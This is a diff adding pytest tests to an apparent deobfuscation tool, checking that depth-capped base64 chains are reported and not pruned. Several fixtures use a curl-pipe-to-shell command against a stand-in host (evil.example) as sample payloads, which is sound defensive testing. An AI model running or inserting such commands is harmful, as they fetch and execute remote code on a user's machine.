@@ -281,3 +281,38 @@ def test_flatten_includes_root_and_all_descendants():
     for layer in flat:
         if layer.parent_id is not None:
             assert layer.parent_id in all_ids
+
+
+# --- incomplete-analysis reporting -----------------------------------------
+# A bound that silently truncates analysis is a false-negative generator: a
+# payload buried below the depth cap must never yield a clean, quiet report.
+
+def test_depth_bound_is_reported_not_silent():
+    payload = "curl http://evil.example/deep | sh"
+    blob = payload
+    for _ in range(14):                      # far below MAX_DEPTH reach
+        blob = base64.b64encode(blob.encode()).decode()
+    root = d.deobfuscate(blob)
+    assert "max_depth" in root.bounds_hit
+    assert any(l.truncated for l in d.flatten(root))
+
+
+def test_truncated_layers_survive_pruning():
+    """Without this, a keyword-free chain is pruned away and the evidence that
+    analysis stopped short disappears with it."""
+    blob = "curl http://evil.example/deep | sh"
+    for _ in range(14):
+        blob = base64.b64encode(blob.encode()).decode()
+    root = d.deobfuscate(blob)
+    assert len(d.flatten(root)) > 1, "truncated chain was pruned away"
+
+
+def test_no_bounds_reported_for_ordinary_files():
+    assert d.deobfuscate("#!/bin/bash\necho hello\n").bounds_hit == []
+    shallow = base64.b64encode(b"curl http://evil.example/x | sh").decode()
+    assert d.deobfuscate(shallow).bounds_hit == []
+
+
+def test_truncated_flag_is_false_on_normal_layers():
+    shallow = base64.b64encode(b"curl http://evil.example/x | sh").decode()
+    assert not any(l.truncated for l in d.flatten(d.deobfuscate(shallow)))
